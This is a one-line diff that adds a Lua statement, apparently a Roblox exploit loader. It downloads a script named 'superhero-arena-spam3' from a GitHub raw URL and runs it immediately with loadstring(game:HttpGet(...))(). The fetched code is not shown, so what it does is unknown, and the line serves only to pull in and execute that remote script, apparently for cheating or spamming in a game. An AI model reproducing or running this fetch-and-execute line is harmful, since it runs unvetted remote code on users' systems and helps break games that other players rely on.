@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/superhero-arena-spam3-2zno37fyonwa0i.lua"))()
